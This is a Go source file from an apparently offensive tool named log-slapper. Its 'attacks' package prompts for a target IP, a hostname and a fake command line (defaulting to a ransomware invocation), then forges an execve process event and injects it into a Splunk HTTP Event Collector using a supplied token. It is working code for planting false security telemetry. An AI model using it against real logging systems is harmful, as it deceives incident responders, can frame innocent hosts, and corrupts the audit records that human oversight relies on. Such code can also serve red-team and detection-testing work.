package attacks

import (
	"flag"
	"fmt"
	"time"

	"github.com/oz9un/log-slapper/pkg/splunk"
	"github.com/pterm/pterm"
)

var commandTime time.Time

func ExecveGetInput() (string, string, string) {
	// Ask for the target ip
	ipPrompt := pterm.DefaultInteractiveTextInput.WithDefaultValue("10.10.41.70")
	targetIp, _ := ipPrompt.Show("Enter the target ip")

	// Ask for the target subnet
	hostnamePrompt := pterm.DefaultInteractiveTextInput.WithDefaultValue("DC-01")
	targetHostname, _ := hostnamePrompt.Show("Enter the target hostname")
	// Ask for the target subnet
	commandPrompt := pterm.DefaultInteractiveTextInput.WithDefaultValue("sudo ./ransomware.sh -encrypt all")
	command, _ := commandPrompt.Show("Enter the process name (full path)")

	// Ask for the command execute time
	timePrompt := pterm.DefaultInteractiveTextInput.WithDefaultValue("24/03/2024 17:16")
	creationTime, _ := timePrompt.Show("Enter the command execution time")

	ExecveEventParameterCheck(creationTime)

	return command, targetHostname, targetIp
}

func ExecveEventParameterCheck(_creationTime string) bool {
	// Check for required flags or use default values
	if _creationTime == "" {
		pterm.Error.Println("Missing required flags: -starttime is required.")
		flag.Usage()
		return false
	}

	var err error

	// Parse start and end time
	commandTime, err = time.Parse(timeFormat, _creationTime)
	if err != nil {
		pterm.Error.Println("Invalid start time format: %v\n", err)
		return false
	}
	return true
}

func ExecveEvent(targetIp string, targetHostname string, commandName string, HEC_url string, HEC_token string) {
	var data [][]string
	formattedTime_str, formattedTime := splunk.FormatWithRandomSeconds(commandTime)

	event := splunk.GenerateExecveEventFromCommand(formattedTime, commandName, targetIp, targetHostname)
	err := splunk.SendHECEvent(HEC_url, HEC_token, event)
	if err != nil {
		fmt.Println("Error sending execve event\n")
	}

	data = append(data, []string{targetHostname, targetIp, commandName, formattedTime_str})
	//fmt.Printf("Execve event sent successfully.\n")

	pterm.DefaultTable.WithHasHeader().WithBoxed().WithData(pterm.TableData(append([][]string{{"Hostname", "IP", "Command", "Time"}}, data...))).Render()
}
